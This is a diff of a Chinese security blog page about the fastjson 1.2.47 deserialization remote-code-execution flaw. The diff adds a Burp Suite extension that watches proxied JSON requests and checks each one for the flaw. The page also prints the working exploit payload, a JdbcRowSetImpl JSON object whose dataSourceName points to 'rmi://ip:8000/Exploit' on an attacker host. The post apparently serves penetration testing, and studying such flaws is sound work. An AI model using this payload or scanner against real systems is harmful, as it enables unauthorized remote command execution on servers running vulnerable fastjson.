@@ -37,7 +37,62 @@
 </footer><!-- /.post-info -->
     <div class="entry-content">
       
-      <p>fastjson在<code>1.2.47</code>以下，包括1.2.47存在反序列化导致的远程命令执行，payload:</p>
+      <p>2019/08/02 Update:</p>
+<ol>
+<li>之前的代码太的太烂，去掉了不用的代码</li>
+<li>增加了hash验证，如果已经请求过的URL第二次就不检测了，需建立<code>/var/tmp/hash.txt</code>文件（自己看着改吧)</li>
+<li>如果不熟悉，就看官方文档，文档，文档。</li>
+</ol>
+<div class="highlight"><pre><span></span><span class="n">main</span><span class="o">.</span><span class="n">py</span>
+
+<span class="c1">#/usr/bin/env python</span>
+<span class="c1">#! -*- coding:utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">burp</span> <span class="kn">import</span> <span class="n">IBurpExtender</span> <span class="c1"># 定义插件的基本信息类</span>
+<span class="kn">from</span> <span class="nn">burp</span> <span class="kn">import</span> <span class="n">IHttpListener</span> <span class="c1"># http流量监听类</span>
+<span class="kn">from</span> <span class="nn">burp</span> <span class="kn">import</span> <span class="n">IRequestInfo</span>
+<span class="kn">from</span> <span class="nn">noauth</span> <span class="kn">import</span> <span class="n">noauth_request</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+
+<span class="k">class</span> <span class="nc">BurpExtender</span><span class="p">(</span><span class="n">IBurpExtender</span><span class="p">,</span> <span class="n">IHttpListener</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">registerExtenderCallbacks</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">callbacks</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_callbacks</span> <span class="o">=</span> <span class="n">callbacks</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_helpers</span> <span class="o">=</span> <span class="n">callbacks</span><span class="o">.</span><span class="n">getHelpers</span><span class="p">()</span> <span class="c1"># 通用函数</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_callbacks</span><span class="o">.</span><span class="n">setExtensionName</span><span class="p">(</span><span class="s2">&quot;fastjson_scan&quot;</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s2">&quot;load fastjson_scan plugin success!&quot;</span>
+        <span class="k">print</span> <span class="s2">&quot;==================================&quot;</span>
+        <span class="c1"># register ourselves as an HTTP listener</span>
+        <span class="n">callbacks</span><span class="o">.</span><span class="n">registerHttpListener</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">processHttpMessage</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">toolFlag</span><span class="p">,</span> <span class="n">messageIsRequest</span><span class="p">,</span> <span class="n">messageInfo</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">toolFlag</span> <span class="o">==</span> <span class="mi">4</span> <span class="ow">or</span> <span class="n">toolFlag</span> <span class="o">==</span> <span class="mi">64</span> <span class="ow">or</span> <span class="n">toolFlag</span> <span class="o">==</span> <span class="mi">16</span> <span class="ow">or</span> <span class="n">toolFlag</span> <span class="o">==</span> <span class="mi">32</span><span class="p">:</span>
+            <span class="k">if</span>  <span class="n">messageIsRequest</span><span class="p">:</span>
+                <span class="n">request</span> <span class="o">=</span> <span class="n">messageInfo</span><span class="o">.</span><span class="n">getRequest</span><span class="p">()</span>
+                <span class="n">analyzedRequest</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_helpers</span><span class="o">.</span><span class="n">analyzeRequest</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+                <span class="n">contype</span> <span class="o">=</span> <span class="n">analyzedRequest</span><span class="o">.</span><span class="n">getContentType</span><span class="p">()</span>  <span class="c1">#get Content-type, 这里看官方文档</span>
+                <span class="n">url</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">messageInfo</span><span class="o">.</span><span class="n">getUrl</span><span class="p">())</span>
+                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/var/tmp/hash.txt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                    <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
+                <span class="n">m</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
+                <span class="n">m</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+                <span class="k">print</span> <span class="n">url</span>
+                <span class="k">if</span> <span class="n">contype</span> <span class="o">==</span> <span class="mi">4</span> <span class="ow">and</span> <span class="n">m</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>    <span class="c1">#是的，json的时候type等于4</span>
+                    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/var/tmp/hash.txt&#39;</span><span class="p">,</span><span class="s1">&#39;a+&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+                    <span class="k">print</span> <span class="s2">&quot;[Info]Check url is: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">url</span>
+                    <span class="n">cur</span> <span class="o">=</span> <span class="n">noauth_request</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+                    <span class="n">noauth_result</span> <span class="o">=</span> <span class="n">cur</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+                    <span class="k">if</span> <span class="n">noauth_result</span><span class="p">:</span> 
+                        <span class="k">print</span> <span class="s2">&quot;[Critical] Found it is a Fastjson RCE </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">noauth_result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+                    <span class="k">print</span> <span class="s2">&quot;======================================================================================&quot;</span>
+                    <span class="k">print</span> <span class="s2">&quot;&quot;</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="k">pass</span>
+</pre></div>
+
+
+<hr>
+<p>fastjson在<code>1.2.47</code>以下，包括1.2.47存在反序列化导致的远程命令执行，payload:</p>
 <div class="highlight"><pre><span></span><span class="err">{</span><span class="ss">&quot;@type&quot;</span><span class="err">:</span><span class="ss">&quot;java.lang.Class&quot;</span><span class="p">,</span><span class="ss">&quot;val&quot;</span><span class="err">:</span><span class="ss">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="err">}</span><span class="p">,</span><span class="ss">&quot;f&quot;</span><span class="err">:{</span><span class="ss">&quot;@type&quot;</span><span class="err">:</span><span class="ss">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="p">,</span><span class="ss">&quot;dataSourceName&quot;</span><span class="err">:</span><span class="ss">&quot;rmi://ip:8000/Exploit&quot;</span><span class="p">,</span><span class="ss">&quot;autoCommit&quot;</span><span class="err">:</span><span class="k">true</span><span class="err">}}</span><span class="w"></span>
 </pre></div>
 
